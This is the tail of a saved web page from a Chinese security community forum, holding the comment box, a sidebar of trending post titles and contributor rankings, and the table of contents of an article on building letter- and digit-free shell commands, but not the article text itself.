                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12242&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12242&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
            <strong>最新公告：</strong>
            <div class="info-body">
                <a href="https://xz.aliyun.com/t/15717" style="padding: 4px 10px 4px 10px;">
                    先知安全沙龙 - 杭州站 10月19日开启！
                </a>
                <span style="float: right;">
                    2024-09-27
                </span>
            </div>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
            <strong>月度热门：</strong>
        </div>
    <div class="info-body">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/54969_ff43f4273e35764443.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15834" title="应用内存中的后渗透利用-远程工具密码读取">
                                应用内存中的后渗透利用-远程工具密码读取
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15841" title="利用 procfs 实现只读环境下的任意写到RCE">
                                利用 procfs 实现只读环境下的任意写到RCE
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15779" title="CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析">
                                CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15811" title="小心你的加密货币，针对加密货币的窃密样本详细分析">
                                小心你的加密货币，针对加密货币的窃密样本详细分析
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15826" title="某OA代码审计">
                                某OA代码审计
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15799" title="kernel从小白到大神(二)">
                                kernel从小白到大神(二)
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15807" title="基于动态Agent挖掘更多的反序列化入口">
                                基于动态Agent挖掘更多的反序列化入口
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15881" title="玄机-哥斯拉 4.0 流量分析 wp">
                                玄机-哥斯拉 4.0 流量分析 wp
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15778" title="由phar反序列化触发的CRMEB前台rce分析">
                                由phar反序列化触发的CRMEB前台rce分析
                            </a>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/t/15819" title="SRC挖掘奇特思路案例">
                                SRC挖掘奇特思路案例
                            </a>
                        </div>

                    </div>
                
            </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year">
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month">
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/10995_36191b735a3f1cf36c.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/10995" title="Al1ex">Al1ex</a>
                            <span class="num-box">
                                <span class="badge badge-important">63</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/3314" title="熊猫正正">熊猫正正</a>
                            <span class="num-box">
                                <span class="badge badge-important">46</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/76340" title="T0daySeeker">T0daySeeker</a>
                            <span class="num-box">
                                <span class="badge badge-important">36</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/43270_40c7bc80a99d40c2ff.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/43270" title="朝闻道">朝闻道</a>
                            <span class="num-box">
                                <span class="badge badge-important">36</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/82355" title="ooyywwll">ooyywwll</a>
                            <span class="num-box">
                                <span class="badge badge-important">28</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/83993" title="1315609050541697" style="">1315609050541697</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/10995_36191b735a3f1cf36c.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/10995" title="Al1ex" style="">Al1ex</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/82355" title="ooyywwll" style="">ooyywwll</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/82111" title="starrysky" style="">starrysky</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/79775" title="1222706425506668" style="">1222706425506668</a>
                            <span class="num-box">
                                <span class="badge badge-important">3</span>
                            </span>
                        </div>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box sfixed" id="toc-container" style="width: 270px;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 154px;"></div>
            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-0">前言</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-1">shell脚本中$的多种用法</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-2">Web-Bash-Vino0o0o的构造思路</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-3">利用$#构造</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-4">利用$?构造</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-5">利用$(())构造</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-6">后记</a></li><li><a href="https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox#toc-7">参考</a></li></ol></div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart);
            $("[data-toggle='tooltip']").tooltip();

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>


        </div>
    </div>


</div>
<footer class="bs-docs-footer">
    <div class="container text-center">
        <div class="links">
            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
            <a href="https://xz.aliyun.com/connection">联系我们</a>
            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
        </div>
    </div>
</footer>

<script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/bootstrap.min.js.下载"></script>
<script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/xz.js.下载"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12242&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12242&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
            $("[data-toggle='tooltip']").tooltip();
        });
    </script>


    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/z_stat.php"></script>


<div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><p class="waf-nc-title">访问验证</p><p class="waf-nc-description">为保证您的正常访问，请进行如下验证。</p><p id="waf-nc-traceid" class="waf-nc-traceid-class"></p><div id="nocaptcha"></div></div></div></body></html>